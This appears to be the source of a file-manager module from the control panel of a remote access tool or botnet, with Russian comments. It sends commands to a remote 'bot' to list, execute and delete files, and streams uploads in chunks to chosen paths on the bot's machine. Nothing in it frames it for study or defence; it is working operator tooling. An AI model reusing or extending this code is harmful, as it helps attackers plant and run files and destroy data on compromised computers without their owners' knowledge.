// frontend/client_control/js/modules/features/fm/FileManagerAPI.js

export const FileManagerAPI = {
  // Отправка JSON-команд (Листинг, Запуск, Удаление)
  send: (action, path, extra = {}) => {
    const isHidden = document.getElementById('file-view-btn')?.classList.contains('active');
    const payload = {
      action,
      path: path === "Computer" ? "" : path,
      show_hidden: !!isHidden,
      ...extra
    };
    window.sendToBot?.('FileManager', payload); 
  },

  // Потоковая загрузка файла НА БОТ (Upload)
  upload: async (file, currentPath) => {
    const CHUNK_SIZE = 65536;
    const wait = ms => new Promise(r => setTimeout(r, ms));
    
    // --- ИСПРАВЛЕНИЕ ПУТИ ---
    // 1. Очищаем путь (если мы в корне дисков, путь пустой)
    let cleanPath = (currentPath === "Computer" || !currentPath) ? "" : currentPath;
    
    // 2. Добавляем слеш в конец, если его нет
    if (cleanPath && !cleanPath.endsWith('\\') && !cleanPath.endsWith('/')) {
        cleanPath += '\\';
    }
    
    // 3. Формируем полный путь: ПАПКА + ИМЯ ФАЙЛА
    const fullRemotePath = cleanPath + file.name;

    console.log(`[Upload] Target path: ${fullRemotePath}`);

    // Анонс: передаем ПОЛНЫЙ путь в метаданных (после двоеточия)
    window.sendToBot?.(`FileTransfer:${fullRemotePath}`, file.size);
    await wait(150); 

    let offset = 0;
    while (offset < file.size) {
        const chunk = await file.slice(offset, offset + CHUNK_SIZE).arrayBuffer();
        
        // Стрим: также используем ПОЛНЫЙ путь, чтобы бот знал, в какой файл писать чанк
        window.sendToBot?.(`FileTransferStream:${fullRemotePath}`, new Uint8Array(chunk));
        
        offset += CHUNK_SIZE;
        await wait(5); 
    }
    
    console.log(`[Upload] Finished: ${file.name}`);
  }
};